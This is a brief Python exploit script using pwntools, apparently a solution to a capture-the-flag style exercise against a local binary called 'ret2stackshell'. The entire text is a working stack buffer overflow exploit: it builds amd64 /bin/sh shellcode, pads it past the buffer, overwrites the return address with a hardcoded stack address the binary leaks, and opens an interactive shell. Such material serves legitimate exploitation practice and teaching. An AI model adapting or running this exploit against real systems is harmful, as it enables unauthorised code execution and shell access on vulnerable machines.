from pwn import *
buf = 0x7fffffffdad0  # printf打印buf地址
context.arch = "amd64"
io = process("./ret2stackshell")
io.recv()
shellcode = asm(shellcraft.amd64.sh())
payload = shellcode.ljust(112+8, b'a')+p64(buf)
io.sendline(payload)
io.interactive()